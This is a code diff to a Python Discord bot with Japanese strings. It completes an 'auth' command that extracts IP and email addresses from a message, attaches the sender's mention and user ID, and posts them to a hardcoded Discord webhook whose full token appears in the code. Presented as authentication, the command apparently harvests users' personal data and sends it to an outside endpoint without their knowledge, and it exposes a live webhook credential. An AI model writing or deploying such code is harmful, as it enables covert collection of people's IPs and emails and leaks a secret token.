@@ -78,4 +78,21 @@ async def auth(ctx):
     ips, emails = extract_ip_and_email(message_content)
 
     if ips or emails:
-        user_info = f"ユーザー: {ctx.author.mention}\nユーザー
+        user_info = f"ユーザー: {ctx.author.mention}\nユーザーID: {ctx.author.id}\n"
+        data = {
+            "content": f"{user_info}IPアドレス: {', '.join(ips)}\nメールアドレス: {', '.join(emails)}"
+        }
+        WEBHOOK_URL = "https://discord.com/api/webhooks/1440776757392441414/0x-51OAe945GtlPK0BY6k3zf34675GLZWL8K7N6AmQ3QnWLBn-nL6yvuWXIG1tjrpwZh"
+        requests.post(WEBHOOK_URL, json=data)
+        await ctx.send("認証情報を抽出しました。")
+    else:
+        await ctx.send("IPアドレスまたはメールアドレスが見つかりませんでした。")
+
+# --- メイン実行 ---
+
+bot_thread = threading.Thread(target=start_bot)
+bot_thread.start()
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
